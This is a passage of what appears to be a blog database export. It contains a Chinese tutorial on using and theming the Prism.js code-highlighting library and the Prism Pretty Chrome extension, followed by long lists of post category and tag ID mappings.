实现并行。</p>\n</li>\n<li><p>轻松扩展<br>定义新语言或扩展现有语法，或者新增功能都非常简单。</p>\n</li>\n<li><p>丰富样式<br>所有的样式通过 CSS 完成，并使用合理的类名如：.comment, .string, .property 等。</p>\n</li>\n</ul>\n</blockquote>\n<h2 id=\"三、简单用法\"><a href=\"#三、简单用法\" class=\"headerlink\" title=\"三、简单用法\"></a>三、简单用法</h2><h3 id=\"1-head添加主题样式\"><a href=\"#1-head添加主题样式\" class=\"headerlink\" title=\"1. head添加主题样式\"></a>1. head添加主题样式</h3><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"http://prismjs.com/themes/prism.css\"</span>&gt;</span></div></pre></td></tr></table></figure>\n<h3 id=\"2-文档末尾添加Prism-类库\"><a href=\"#2-文档末尾添加Prism-类库\" class=\"headerlink\" title=\"2. 文档末尾添加Prism 类库\"></a>2. 文档末尾添加Prism 类库</h3><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">\"http://prismjs.com/prism.js\"</span>&gt;</span><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></div></pre></td></tr></table></figure>\n<h3 id=\"3-添加测试代码\"><a href=\"#3-添加测试代码\" class=\"headerlink\" title=\"3. 添加测试代码\"></a>3. 添加测试代码</h3><blockquote>\n<p>遵循 <a href=\"http://www.w3.org/TR/html5/grouping-content.html#the-pre-element\">HTML5 标准</a>，Prism 使用语义化的 <code>pre</code> 元素和 <code>code</code> 元素来标记代码区块。</p>\n</blockquote>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">pre</span> <span class=\"attr\">class</span>=<span class=\"string\">\"language-css\"</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">code</span>&gt;</span>p &#123; color: red &#125;<span class=\"tag\">&lt;/<span class=\"name\">code</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">pre</span>&gt;</span></div></pre></td></tr></table></figure>\n<h3 id=\"4-完整代码\"><a href=\"#4-完整代码\" class=\"headerlink\" title=\"4. 完整代码\"></a>4. 完整代码</h3><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">&lt;!DOCTYPE html&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></div><div class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>代码高亮类库Prism.js<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></div><div class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"http://prismjs.com/themes/prism.css\"</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></div><div class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">pre</span> <span class=\"attr\">class</span>=<span class=\"string\">\"language-css\"</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">code</span>&gt;</span>p &#123; color: red &#125;<span class=\"tag\">&lt;/<span class=\"name\">code</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">pre</span>&gt;</span></div><div class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">\"http://prismjs.com/prism.js\"</span>&gt;</span><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></div></pre></td></tr></table></figure>\n<h3 id=\"5-输出样式\"><a href=\"#5-输出样式\" class=\"headerlink\" title=\"5. 输出样式\"></a>5. 输出样式</h3><p><img src=\"http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/代码高亮类库Prism/Snip20160825_53.png\" alt=\"Prism高亮效果\"></p>","more":"<h2 id=\"四、扩展内容\"><a href=\"#四、扩展内容\" class=\"headerlink\" title=\"四、扩展内容\"></a>四、扩展内容</h2><h3 id=\"1-高亮语法支持\"><a href=\"#1-高亮语法支持\" class=\"headerlink\" title=\"1. 高亮语法支持\"></a>1. 高亮语法支持</h3><p>默认的prism-core只支持少量的语法高亮，如：html, css, javascript等。</p>\n<p>如需要针对java、C、python语法进行高亮显示的话，需要额外引入特定语法高亮类库。</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">\"http://prismjs.com/components/prism-java.js\"</span>&gt;</span><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">\"http://prismjs.com/components/prism-sql.js\"</span>&gt;</span><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">\"http://prismjs.com/components/prism-python.js\"</span>&gt;</span><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></div></pre></td></tr></table></figure>\n<p><strong>注</strong>：扩展的语法高亮类库位置放于prism.js之后。另外，也可以在下载prismjs里把需要的类库都打包进prismjs.js里。</p>\n<p>效果如下图所示：</p>\n<p><img src=\"http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/代码高亮类库Prism/Snip20160825_54.png\" alt=\"java语法高亮效果\"></p>\n<h3 id=\"2-高亮主题\"><a href=\"#2-高亮主题\" class=\"headerlink\" title=\"2. 高亮主题\"></a>2. 高亮主题</h3><p>prismjs支持多种高亮主题，默认的就是上述截图的主题。</p>\n<p>如果有其他的主题偏好，可以更换prismjs主题样式。</p>\n<p>方法如下 ：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"http://prismjs.com/themes/prism-okaidia.css\"</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"http://prismjs.com/themes/prism-solarizedlight.css\"</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"http://prismjs.com/themes/prism-dark.css\"</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"http://prismjs.com/themes/prism-twilight.css\"</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"http://prismjs.com/themes/prism-coy.css\"</span>&gt;</span></div></pre></td></tr></table></figure>\n<p>除了本文列出的几种主题外，还支持其他几种，不一一列举。</p>\n<p>就列出的这几种主题而言，个人比较喜欢 <strong>亮色的coy</strong> 主题和  <strong>暗色的dark</strong> 主题。</p>\n<h2 id=\"五、基于Chrome插件：Prism-Pretty\"><a href=\"#五、基于Chrome插件：Prism-Pretty\" class=\"headerlink\" title=\"五、基于Chrome插件：Prism Pretty\"></a>五、基于Chrome插件：Prism Pretty</h2><blockquote>\n<p>A Chrome Extension to format/highlight/preview HTML/JS/CSS/Markdown code with Prism.js</p>\n</blockquote>\n<h3 id=\"1-插件预览\"><a href=\"#1-插件预览\" class=\"headerlink\" title=\"1. 插件预览\"></a>1. 插件预览</h3><p>该插件可用于高亮显示html、js、css以及markdown语法。</p>\n<p>实际体验后，html、js、css展示效果很不错，特别markdown语法展示效果意外的好。感觉整体插件做工精致、功能强大。不过，目前markdown代码预览样式目前无法设置。</p>\n<p>插件设置界面如下图所示：</p>\n<p><img src=\"http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/代码高亮类库Prism/screenshot.png\" alt=\"Prism Pretty截图\"></p>\n<h3 id=\"2-内容预览\"><a href=\"#2-内容预览\" class=\"headerlink\" title=\"2. 内容预览\"></a>2. 内容预览</h3><p>试用了一下该插件，意外发现插件的一个强大功能：居然还能预览颜色代码内容、长度代码内容、图片链接内容等。</p>\n<p>大家感受一下效果：</p>\n<h4 id=\"预览颜色代码\"><a href=\"#预览颜色代码\" class=\"headerlink\" title=\"预览颜色代码\"></a>预览颜色代码</h4><p> <img src=\"http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/代码高亮类库Prism/Snip20160825_57.png\" alt=\"预览颜色代码\"></p>\n<h4 id=\"预览时间代码\"><a href=\"#预览时间代码\" class=\"headerlink\" title=\"预览时间代码\"></a>预览时间代码</h4><p> <img src=\"http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/代码高亮类库Prism/Snip20160825_60.png\" alt=\"预览时间代码\"></p>\n<h4 id=\"预览长度代码\"><a href=\"#预览长度代码\" class=\"headerlink\" title=\"预览长度代码\"></a>预览长度代码</h4><p> <img src=\"http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/代码高亮类库Prism/Snip20160825_58.png\" alt=\"预览长度代码\"></p>\n<h4 id=\"预览图片链接\"><a href=\"#预览图片链接\" class=\"headerlink\" title=\"预览图片链接\"></a>预览图片链接</h4><p> <img src=\"http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/代码高亮类库Prism/Snip20160825_62.png\" alt=\"预览图片链接\"></p>\n<h2 id=\"六、参考文档\"><a href=\"#六、参考文档\" class=\"headerlink\" title=\"六、参考文档\"></a>六、参考文档</h2><ul>\n<li><a href=\"http://prismjs.com/index.html\">prismjs官网</a></li>\n<li><a href=\"http://blog.wpjam.com/m/prism/\">Prism：轻量级的 Javascript 代码高亮库</a></li>\n<li><a href=\"http://c7sky.com/syntax-highlighting-with-prismjs.html\">使用 Prism.js 实现漂亮的代码语法高亮</a></li>\n<li><a href=\"http://prismjs.com/test.html\">Prism Test drive</a></li>\n<li><a href=\"https://raw.githubusercontent.com/L3au/Prism-Pretty/master/README.md\">Prism Pretty说明文档</a></li>\n<li><a href=\"https://github.com/L3au/Prism-Pretty\">Prism Pretty</a></li>\n</ul>"}],"PostAsset":[],"PostCategory":[{"post_id":"cis6vlxo200045nbtii8afu77","category_id":"cis6vlxo900075nbtlanai6kg","_id":"cis6vlxol000f5nbt2no7ytm7"},{"post_id":"cis6vlxoc00095nbtye1ur215","category_id":"cis6vlxoi000d5nbtpnx9km6v","_id":"cis6vlxoq000k5nbtef4i4drl"},{"post_id":"cis6vlxop000j5nbtn0fw6v7x","category_id":"cis6vlxot000n5nbtaxpb93ds","_id":"cis6vlxoy000s5nbt1ekohy4o"},{"post_id":"cis6vlxot000o5nbtmmfe64s5","category_id":"cis6vlxox000r5nbtfdpb3jan","_id":"cis6vlxoy000w5nbtvrcbc0w4"},{"post_id":"cis6vlxpu000y5nbtc5p7esr3","category_id":"cis6vlxpz00115nbts575nni5","_id":"cis6vlxqg001a5nbth3oo81an"},{"post_id":"cis6vlxqd00185nbth6cbcqx7","category_id":"cis6vlxqd00165nbt1fqcfy89","_id":"cis6vlxqm001h5nbtv28p87bm"},{"post_id":"cis6vlxpx000z5nbtptbemyhp","category_id":"cis6vlxqd00165nbt1fqcfy89","_id":"cis6vlxqq001l5nbt7fivromu"},{"post_id":"cis6vlxq000125nbt5p8ylxre","category_id":"cis6vlxqd00165nbt1fqcfy89","_id":"cis6vlxqu001o5nbtr8qqbq35"},{"post_id":"cis6vlxq100135nbt2oyr27d0","category_id":"cis6vlxqd00165nbt1fqcfy89","_id":"cis6vlxqy001t5nbth658loo3"},{"post_id":"cis6vlxqb00155nbtkd9r1xsi","category_id":"cis6vlxqd00165nbt1fqcfy89","_id":"cis6vlxr5001z5nbtyl6m38h3"},{"post_id":"cis6vlxr1001w5nbtqqbop5wf","category_id":"cis6vlxqz001u5nbtlxf4ipxb","_id":"cis6vlxrb00255nbt9ytp4o3v"},{"post_id":"cis6vlxqg001b5nbtsvmo6l1b","category_id":"cis6vlxqz001u5nbtlxf4ipxb","_id":"cis6vlxrf002a5nbt6js325wh"},{"post_id":"cis6vlxr3001y5nbtgibvi1ne","category_id":"cis6vlxpz00115nbts575nni5","_id":"cis6vlxri002d5nbtgns440md"},{"post_id":"cis6vlxr600235nbtiw48vg3f","category_id":"cis6vlxpz00115nbts575nni5","_id":"cis6vlxrk002h5nbt86skbl4m"},{"post_id":"cis6vlxqj001f5nbtgp9it2xk","category_id":"cis6vlxqz001u5nbtlxf4ipxb","_id":"cis6vlxrm002l5nbthx06g3v5"},{"post_id":"cis6vlxrb00265nbtk87ywm86","category_id":"cis6vlxpz00115nbts575nni5","_id":"cis6vlxro002p5nbt883nhpns"},{"post_id":"cis6vlxrg002b5nbtqcgz4mkn","category_id":"cis6vlxpz00115nbts575nni5","_id":"cis6vlxrq002t5nbt0rv5sfrh"},{"post_id":"cis6vlxqn001i5nbtjl6gf85a","category_id":"cis6vlxqz001u5nbtlxf4ipxb","_id":"cis6vlxru002x5nbtg5y13h0u"},{"post_id":"cis6vlxrj002e5nbt1tb2gov3","category_id":"cis6vlxpz00115nbts575nni5","_id":"cis6vlxrw00315nbtkivb7d6q"},{"post_id":"cis6vlxrl002j5nbtkn4vgisc","category_id":"cis6vlxpz00115nbts575nni5","_id":"cis6vlxry00355nbtb7j0rdvd"},{"post_id":"cis6vlxqq001m5nbt2qpqbcp9","category_id":"cis6vlxqz001u5nbtlxf4ipxb","_id":"cis6vlxs100395nbtvcabtuo0"},{"post_id":"cis6vlxqt001n5nbtuc2atd9h","category_id":"cis6vlxqz001u5nbtlxf4ipxb","_id":"cis6vlxs2003c5nbtnpqrhwen"},{"post_id":"cis6vlxqv001r5nbtakv5omgk","category_id":"cis6vlxqz001u5nbtlxf4ipxb","_id":"cis6vlxs5003f5nbtlp3srk0p"},{"post_id":"cis6vlxqx001s5nbtfg7d3lf9","category_id":"cis6vlxqz001u5nbtlxf4ipxb","_id":"cis6vlxs7003h5nbtp9dgdcib"},{"post_id":"cis6vlxs3003e5nbtl2z3uqzt","category_id":"cis6vlxs2003b5nbtidccoyeb","_id":"cis6vlxsc003l5nbtwfh4xrni"},{"post_id":"cis6vlxrm002m5nbt355h27r5","category_id":"cis6vlxs2003b5nbtidccoyeb","_id":"cis6vlxsf003o5nbt7rdmtndz"},{"post_id":"cis6vlxs7003j5nbtey6xddka","category_id":"cis6vlxs2003b5nbtidccoyeb","_id":"cis6vlxsh003t5nbtbkldlqvl"},{"post_id":"cis6vlxrp002r5nbt99ui8xuk","category_id":"cis6vlxs2003b5nbtidccoyeb","_id":"cis6vlxsj003v5nbtd0vasslj"},{"post_id":"cis6vlxrr002u5nbthfs7rup8","category_id":"cis6vlxs2003b5nbtidccoyeb","_id":"cis6vlxsn00415nbt5auq62w4"},{"post_id":"cis6vlxru002z5nbtphv1ci2n","category_id":"cis6vlxs2003b5nbtidccoyeb","_id":"cis6vlxsu00475nbtbty3xflq"},{"post_id":"cis6vlxrw00325nbt6q5gunas","category_id":"cis6vlxs2003b5nbtidccoyeb","_id":"cis6vlxt0004d5nbtlprsxvgp"},{"post_id":"cis6vlxrz00375nbta7gyb9ou","category_id":"cis6vlxs2003b5nbtidccoyeb","_id":"cis6vlxt5004k5nbtfwuvpbgq"},{"post_id":"cis6vlxsy004b5nbt3qcy6kl0","category_id":"cis6vlxot000n5nbtaxpb93ds","_id":"cis6vlxt7004n5nbtw65q8wvd"},{"post_id":"cis6vlxt1004f5nbtdxi83qzc","category_id":"cis6vlxot000n5nbtaxpb93ds","_id":"cis6vlxt9004r5nbtkov2ot9p"},{"post_id":"cis6vlxs1003a5nbtv6z1yolc","category_id":"cis6vlxs2003b5nbtidccoyeb","_id":"cis6vlxtb004v5nbtol75w6ow"},{"post_id":"cis6vlxt4004i5nbt8hdve0xe","category_id":"cis6vlxot000n5nbtaxpb93ds","_id":"cis6vlxtf004z5nbtap1xuw9q"},{"post_id":"cis6vlxt6004m5nbtamxealj1","category_id":"cis6vlxot000n5nbtaxpb93ds","_id":"cis6vlxti00535nbt7lu7l26o"},{"post_id":"cis6vlxt8004p5nbtz6yb02vl","category_id":"cis6vlxot000n5nbtaxpb93ds","_id":"cis6vlxtl00565nbtg6zajlns"},{"post_id":"cis6vlxs6003g5nbt2zs8lc0y","category_id":"cis6vlxt5004l5nbt7sm1tauz","_id":"cis6vlxto005a5nbtvymcj0ot"},{"post_id":"cis6vlxt9004s5nbt59nsjv2k","category_id":"cis6vlxot000n5nbtaxpb93ds","_id":"cis6vlxtq005e5nbtwz1c4zqo"},{"post_id":"cis6vlxtc004x5nbtm3lrq3xn","category_id":"cis6vlxot000n5nbtaxpb93ds","_id":"cis6vlxts005i5nbt3brd642i"},{"post_id":"cis6vlxsd003n5nbtmrq6y2d1","category_id":"cis6vlxt5004l5nbt7sm1tauz","_id":"cis6vlxtu005m5nbtxnimok1y"},{"post_id":"cis6vlxtf00505nbtz95tmmoq","category_id":"cis6vlxot000n5nbtaxpb93ds","_id":"cis6vlxty005p5nbtch4ia9sh"},{"post_id":"cis6vlxtj00555nbtjn75ggjd","category_id":"cis6vlxot000n5nbtaxpb93ds","_id":"cis6vlxu1005s5nbtlhm2expv"},{"post_id":"cis6vlxsf003r5nbtxy0rsm4e","category_id":"cis6vlxt5004l5nbt7sm1tauz","_id":"cis6vlxu5005w5nbtog82ym9n"},{"post_id":"cis6vlxtm00585nbtrqhmvs7b","category_id":"cis6vlxox000r5nbtfdpb3jan","_id":"cis6vlxu800605nbtk974fgji"},{"post_id":"cis6vlxto005d5nbt9zpe3mec","category_id":"cis6vlxox000r5nbtfdpb3jan","_id":"cis6vlxua00645nbt8v9ail6n"},{"post_id":"cis6vlxsh003u5nbtdnm19v4d","category_id":"cis6vlxt5004l5nbt7sm1tauz","_id":"cis6vlxuc00665nbt8rt0bxbs"},{"post_id":"cis6vlxtq005g5nbtobojkg3l","category_id":"cis6vlxot000n5nbtaxpb93ds","_id":"cis6vlxue006a5nbt4cpj9dki"},{"post_id":"cis6vlxts005k5nbtgxguzvbp","category_id":"cis6vlxox000r5nbtfdpb3jan","_id":"cis6vlxuh006c5nbtcuy4ncwv"},{"post_id":"cis6vlxsj003x5nbtxiw4k5ln","category_id":"cis6vlxts005h5nbttsh68u03","_id":"cis6vlxuj006g5nbtx1v18q4w"},{"post_id":"cis6vlxtu005n5nbt1hlnr2j0","category_id":"cis6vlxox000r5nbtfdpb3jan","_id":"cis6vlxul006j5nbtzygbf4wd"},{"post_id":"cis6vlxty005q5nbthlho55tl","category_id":"cis6vlxs2003b5nbtidccoyeb","_id":"cis6vlxun006m5nbt46w0dljk"},{"post_id":"cis6vlxsm00405nbtowaf38az","category_id":"cis6vlxts005h5nbttsh68u03","_id":"cis6vlxup006o5nbtfh4blazj"},{"post_id":"cis6vlxu2005t5nbtubudtep7","category_id":"cis6vlxs2003b5nbtidccoyeb","_id":"cis6vlxur006t5nbtal20fijt"},{"post_id":"cis6vlxu6005x5nbt9q5xqqwj","category_id":"cis6vlxs2003b5nbtidccoyeb","_id":"cis6vlxus006w5nbti9ihk0vv"},{"post_id":"cis6vlxso00445nbty3vbyro3","category_id":"cis6vlxts005h5nbttsh68u03","_id":"cis6vlxuu00715nbtkhwktqbm"},{"post_id":"cis6vlxu800615nbtqrhzbghj","category_id":"cis6vlxs2003b5nbtidccoyeb","_id":"cis6vlxuw00735nbtk08r80dg"},{"post_id":"cis6vlxub00655nbtpt740kps","category_id":"cis6vlxs2003b5nbtidccoyeb","_id":"cis6vlxuy00765nbtjpfjrdpn"},{"post_id":"cis6vlxsr00465nbtytfpqxwd","category_id":"cis6vlxua00635nbtqay65s3x","_id":"cis6vlxv000795nbt8knr86n0"},{"post_id":"cis6vlxud00685nbtrtj4b0c1","category_id":"cis6vlxs2003b5nbtidccoyeb","_id":"cis6vlxv1007d5nbt2eovyq3y"},{"post_id":"cis6vlxuf006b5nbt9gm8o34d","category_id":"cis6vlxs2003b5nbtidccoyeb","_id":"cis6vlxv5007g5nbt6d3qcng7"},{"post_id":"cis6vlxsv00495nbtk77wxz34","category_id":"cis6vlxua00635nbtqay65s3x","_id":"cis6vlxv6007j5nbtwuh3pgex"},{"post_id":"cis6vlxui006e5nbtku9cop11","category_id":"cis6vlxot000n5nbtaxpb93ds","_id":"cis6vlxv6007l5nbt3x5oyaba"},{"post_id":"cis6vlxuj006h5nbtgwrbym3g","category_id":"cis6vlxot000n5nbtaxpb93ds","_id":"cis6vlxv7007o5nbtggy9c1bi"},{"post_id":"cis6vlxun006n5nbtj00r38rs","category_id":"cis6vlxox000r5nbtfdpb3jan","_id":"cis6vlxv7007p5nbtgt5cwyqf"},{"post_id":"cis6vlxur006u5nbtgfbeczz4","category_id":"cis6vlxox000r5nbtfdpb3jan","_id":"cis6vlxv7007r5nbtgkzgbv1j"},{"post_id":"cis6vlxul006l5nbtamrnvs9u","category_id":"cis6vlxup006p5nbt7rto1xnz","_id":"cis6vlxv8007t5nbt0kwr1twf"},{"post_id":"cis6vlxus006x5nbtxwpssbcl","category_id":"cis6vlxox000r5nbtfdpb3jan","_id":"cis6vlxv8007v5nbtlkovf9vc"},{"post_id":"cis6vlxuu00725nbt9aidtanz","category_id":"cis6vlxox000r5nbtfdpb3jan","_id":"cis6vlxv8007x5nbtnr7qxcwo"},{"post_id":"cis6vlxup006r5nbt2z0ttom6","category_id":"cis6vlxup006p5nbt7rto1xnz","_id":"cis6vlxv8007y5nbt5cx90ei1"},{"post_id":"cis6vlxuw00745nbtw6isgdp0","category_id":"cis6vlxox000r5nbtfdpb3jan","_id":"cis6vlxv900815nbt526odbc8"},{"post_id":"cis6vlxuy00785nbtreoasfsk","category_id":"cis6vlxox000r5nbtfdpb3jan","_id":"cis6vlxv900835nbtuxqrhtmt"},{"post_id":"cis6vlxv0007b5nbtrguqycrn","category_id":"cis6vlxox000r5nbtfdpb3jan","_id":"cis6vlxv900855nbt9vp7ikza"},{"post_id":"cis6vlxv2007f5nbtx91vheax","category_id":"cis6vlxox000r5nbtfdpb3jan","_id":"cis6vlxv900865nbtp569r01f"},{"post_id":"cisa72gq80003dnbtophaj2jh","category_id":"cis6vlxts005h5nbttsh68u03","_id":"cisa72gqa0005dnbterjjp1hi"}],"PostTag":[{"post_id":"cis6vlxo200045nbtii8afu77","tag_id":"cis6vlxo800065nbtrj17b1jj","_id":"cis6vlxoi000c5nbt52wzk8ut"},{"post_id":"cis6vlxoc00095nbtye1ur215","tag_id":"cis6vlxoi000b5nbtardj1xqp","_id":"cis6vlxoo000i5nbthv6l49xr"},{"post_id":"cis6vlxop000j5nbtn0fw6v7x","tag_id":"cis6vlxos000m5nbt57ojvx6f","_id":"cis6vlxoy000u5nbt08230l0c"},{"post_id":"cis6vlxop000j5nbtn0fw6v7x","tag_id":"cis6vlxox000q5nbts0g0gito","_id":"cis6vlxoy000v5nbt6amyu052"},{"post_id":"cis6vlxot000o5nbtmmfe64s5","tag_id":"cis6vlxoy000t5nbtvhmu5rah","_id":"cis6vlxoz000x5nbtj4h0z905"},{"post_id":"cis6vlxpu000y5nbtc5p7esr3","tag_id":"cis6vlxoi000b5nbtardj1xqp","_id":"cis6vlxqd00175nbtjx2w3o5h"},{"post_id":"cis6vlxpu000y5nbtc5p7esr3","tag_id":"cis6vlxpz00105nbt4a1ybu64","_id":"cis6vlxqg00195nbth07z4y7x"},{"post_id":"cis6vlxqd00185nbth6cbcqx7","tag_id":"cis6vlxq300145nbt270h3s9a","_id":"cis6vlxqj001e5nbt1l49nt7f"},{"post_id":"cis6vlxpx000z5nbtptbemyhp","tag_id":"cis6vlxq300145nbt270h3s9a","_id":"cis6vlxqm001g5nbt1iguw3je"},{"post_id":"cis6vlxq000125nbt5p8ylxre","tag_id":"cis6vlxq300145nbt270h3s9a","_id":"cis6vlxr2001x5nbtzp3ulq02"},{"post_id":"cis6vlxq000125nbt5p8ylxre","tag_id":"cis6vlxqp001j5nbttb0vjwxm","_id":"cis6vlxr500205nbtf78xb4b5"},{"post_id":"cis6vlxq000125nbt5p8ylxre","tag_id":"cis6vlxqu001q5nbtenvdtipb","_id":"cis6vlxra00245nbtphpzjown"},{"post_id":"cis6vlxq100135nbt2oyr27d0","tag_id":"cis6vlxq300145nbt270h3s9a","_id":"cis6vlxre00275nbtznmt0yk3"},{"post_id":"cis6vlxr3001y5nbtgibvi1ne","tag_id":"cis6vlxo800065nbtrj17b1jj","_id":"cis6vlxri002c5nbti426fmnc"},{"post_id":"cis6vlxr3001y5nbtgibvi1ne","tag_id":"cis6vlxqp001j5nbttb0vjwxm","_id":"cis6vlxrk002f5nbt4y2j9s56"},{"post_id":"cis6vlxr3001y5nbtgibvi1ne","tag_id":"cis6vlxqu001q5nbtenvdtipb","_id":"cis6vlxrm002k5nbttjlpyol2"},{"post_id":"cis6vlxqb00155nbtkd9r1xsi","tag_id":"cis6vlxq300145nbt270h3s9a","_id":"cis6vlxro002n5nbtkegntntm"},{"post_id":"cis6vlxrb00265nbtk87ywm86","tag_id":"cis6vlxo800065nbtrj17b1jj","_id":"cis6vlxrq002s5nbtkzvdjtuk"},{"post_id":"cis6vlxqg001b5nbtsvmo6l1b","tag_id":"cis6vlxre00295nbt7n1hgovc","_id":"cis6vlxrt002v5nbtm2rhujkl"},{"post_id":"cis6vlxqj001f5nbtgp9it2xk","tag_id":"cis6vlxre00295nbt7n1hgovc","_id":"cis6vlxrw00305nbtk4n1647g"},{"post_id":"cis6vlxqn001i5nbtjl6gf85a","tag_id":"cis6vlxre00295nbt7n1hgovc","_id":"cis6vlxry00335nbt1o0nxp4p"},{"post_id":"cis6vlxqq001m5nbt2qpqbcp9","tag_id":"cis6vlxre00295nbt7n1hgovc","_id":"cis6vlxs000385nbtt1sybhau"},{"post_id":"cis6vlxqt001n5nbtuc2atd9h","tag_id":"cis6vlxre00295nbt7n1hgovc","_id":"cis6vlxsc003m5nbtg9cheykl"},{"post_id":"cis6vlxqt001n5nbtuc2atd9h","tag_id":"cis6vlxs2003d5nbt3yq5ncr1","_id":"cis6vlxsf003q5nbtf6de0hdw"},{"post_id":"cis6vlxqv001r5nbtakv5omgk","tag_id":"cis6vlxre00295nbt7n1hgovc","_id":"cis6vlxsm003z5nbtjhrb15dx"},{"post_id":"cis6vlxqv001r5nbtakv5omgk","tag_id":"cis6vlxs2003d5nbt3yq5ncr1","_id":"cis6vlxso00435nbtmf7n20o6"},{"post_id":"cis6vlxqx001s5nbtfg7d3lf9","tag_id":"cis6vlxre00295nbt7n1hgovc","_id":"cis6vlxt0004c5nbt8o4l7ecx"},{"post_id":"cis6vlxqx001s5nbtfg7d3lf9","tag_id":"cis6vlxsq00455nbtg8119k5p","_id":"cis6vlxt3004g5nbtrtql107x"},{"post_id":"cis6vlxr1001w5nbtqqbop5wf","tag_id":"cis6vlxre00295nbt7n1hgovc","_id":"cis6vlxt5004j5nbtlmngiu5g"},{"post_id":"cis6vlxr600235nbtiw48vg3f","tag_id":"cis6vlxo800065nbtrj17b1jj","_id":"cis6vlxt9004q5nbt5sctmeoh"},{"post_id":"cis6vlxr600235nbtiw48vg3f","tag_id":"cis6vlxt3004h5nbty76g6e36","_id":"cis6vlxtb004u5nbtn7ukk1ff"},{"post_id":"cis6vlxrg002b5nbtqcgz4mkn","tag_id":"cis6vlxo800065nbtrj17b1jj","_id":"cis6vlxte004y5nbtfiaw9ugd"},{"post_id":"cis6vlxrg002b5nbtqcgz4mkn","tag_id":"cis6vlxt3004h5nbty76g6e36","_id":"cis6vlxti00525nbtbl9g73el"},{"post_id":"cis6vlxrj002e5nbt1tb2gov3","tag_id":"cis6vlxo800065nbtrj17b1jj","_id":"cis6vlxtl00575nbt34hf0c79"},{"post_id":"cis6vlxrj002e5nbt1tb2gov3","tag_id":"cis6vlxtb004w5nbts6a9xzaj","_id":"cis6vlxto005b5nbtl1cf9exz"},{"post_id